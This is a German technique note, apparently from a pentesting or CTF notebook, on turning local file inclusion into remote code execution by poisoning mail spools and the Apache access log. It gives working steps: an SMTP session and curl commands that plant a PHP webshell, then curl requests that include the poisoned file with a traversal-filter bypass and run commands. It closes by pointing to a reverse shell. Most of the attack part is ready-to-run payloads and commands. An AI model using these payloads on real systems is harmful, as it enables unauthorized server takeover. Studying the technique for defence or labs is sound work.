---
tags: [technique, exploitation, web, rce]
aliases: [Log Poisoning, LFI to RCE]
---
# Mail / Log Poisoning (LFI → RCE)

> Eine Datei, die der Server später per [[Local File Inclusion|LFI]] einbindet, mit PHP-Code "vergiften". Beim Einbinden wird der Code ausgeführt => **RCE**.

## Prinzip
1. Datei mit steuerbarem Inhalt wählen (Mailbox, Log).
2. PHP-Payload hineinschreiben.
3. Datei via LFI einbinden → PHP läuft.

## Mail als Träger
Mailbox liegt in `/var/mail/<user>`. Mail per SMTP (Port 25) einschleusen – [[telnet]] / [[netcat]]:
```smtp
HELO x
MAIL FROM: <a@x>
RCPT TO: <user@localhost>
DATA
Subject: pwn

<?php system($_GET['cmd']); ?>
.
QUIT
```
> [!warning] `454 Relay access denied`
> Server nimmt nur eigene Domains. Begrüßung verrät den echten Hostnamen → `user@localhost` oder `user@<hostname>` nehmen.

## Log als Träger (Apache access.log)
Jeder HTTP-Request landet in `/var/log/apache2/access.log` (Ubuntu/Debian; RedHat/CentOS → `/var/log/httpd/`). Das letzte Feld ist der **`User-Agent`** – vom Client frei wählbar und ungeprüft geloggt → idealer Träger.

**(1)** PHP-Payload als User-Agent in den Log schreiben – [[curl]]:
```bash
curl http://ziel/ \
  -H "User-Agent: <?php system(\$_GET['cmd']); ?>" \
  -b "PHPSESSID=<session>"
```
**(2)** Log via LFI einbinden + Befehl über GET-Parameter auslösen:
```bash
curl "http://ziel/dashboard.php?cmd=id" \
  -b "PHPSESSID=<session>" \
  --data-urlencode "file=/var/log/apache2/access.log"
```
> [!note] POST-Body vs. URL-Parameter
> Hier liest die Seite die Datei über einen **POST-Parameter** (`file=`), die Webshell nimmt den Befehl aber über den **GET-Parameter** (`?cmd=`). Beides muss im selben Request stehen.

> [!tip] `$` escapen
> In doppelten Quotes der Shell muss `\$_GET` escaped werden, sonst expandiert die lokale Bash die Variable weg.

## Webshell-Payload
```php
<?php system($_GET['cmd']); ?>
```
- `system()` = führt Shell-Befehl aus
- `$_GET['cmd']` = Befehl aus URL => **1 Datei, beliebig viele Befehle**

## Auslösen
```bash
curl -G "http://ziel/index.php" \
  --data-urlencode "page=....//....//var/mail/user" \
  --data-urlencode "cmd=id"
```
=> Danach [[Reverse Shell]] für stabilen Zugang.
